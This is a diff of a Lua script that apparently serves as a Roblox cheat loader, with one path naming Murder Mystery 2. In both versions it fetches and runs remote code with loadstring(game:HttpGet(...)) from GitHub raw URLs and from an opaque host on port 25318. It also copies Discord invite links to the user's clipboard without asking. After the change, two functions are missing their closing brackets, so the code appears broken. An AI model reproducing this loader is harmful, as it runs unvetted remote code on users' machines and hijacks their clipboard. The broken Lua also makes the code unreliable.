@@ -1,57 +1,41 @@
-local function s1() 
-    loadstring(game:HttpGet("http://d20.aurorix.net:25318/zhrIfHK3hRcNBoFFnGPaPqJE0PXtAlOsmmL4KU4PyPCaFzthAzU8rG4PKmkMrQEkeut8nIGo3rbCE4VW"))()
-end 
+local function s1() 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/bvfjaj/vx-n/refs/heads/main/324281"))()
+end 
 
-local function s2()
-    task.spawn(function()
-    task.wait(0.5)
-    setclipboard("https://discord.gg/GmT3uvzhVH")
-    WindUI:Notify({
-        Title = "Discord Copied!",
-        Content = "Join our community! Link copied to clipboard.",
-        Icon = "message-circle",
-        Duration = 4
-    })
-end)
- end
+local function s2() 
+    task.spawn(function()
+    task.wait(.01)
+    setclipboard("https://discord.gg/4ghEwM5vDr")
+    WindUI:Notify({
+        Title = "Discord Copied!",
+        Content = "Join our community! Link copied to clipboard.",
+        Icon = "message-circle",
+        Duration = 4
+    })
+end
 
-local function s3() 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua", true))()
-end 
+local function s3() 
+   loadstring(game:HttpGet("http://d20.aurorix.net:25318/zhrIfHK3hRcNBoFFnGPaPqJE0PXtAlOsmmL4KU4PyPCaFzthAzU8rG4PKmkMrQEkeut8nIGo3rbCE4VW"))()    
+end 
 
-local function s4() 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/bvfjaj/vx-n/refs/heads/main/324281"))() 
+local function s4()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua", true))()
 end
 
 local function s5()
-    task.spawn(function()
-    task.wait(0.5)
-    setclipboard("https://discord.gg/GmT3uvzhVH")
-    WindUI:Notify({
-        Title = "Discord Copied!",
-        Content = "Join our community! Link copied to clipboard.",
-        Icon = "message-circle",
-        Duration = 4
-    })
-end)
- end
-
-local function s6()
-    task.spawn(function()
-    task.wait(0.1)
-    setclipboard("https://discord.gg/GmT3uvzhVH")
-    WindUI:Notify({
-        Title = "Discord Copied!",
-        Content = "Join our community! Link copied to clipboard.",
-        Icon = "message-circle",
-        Duration = 4
-    })
-end)
- end
+    task.spawn(function()
+    task.wait(1)
+    setclipboard("https://discord.gg/4ghEwM5vDr")
+    WindUI:Notify({
+        Title = "Discord Copied!",
+        Content = "Join our community! Link copied to clipboard.",
+        Icon = "message-circle",
+        Duration = 4
+    })
+ end
 
 task.spawn(s1)
-task.spawn(s2) 
+task.spawn(s2) 
 task.spawn(s3)
 task.spawn(s4)
 task.spawn(s5)
-task.spawn(s6)
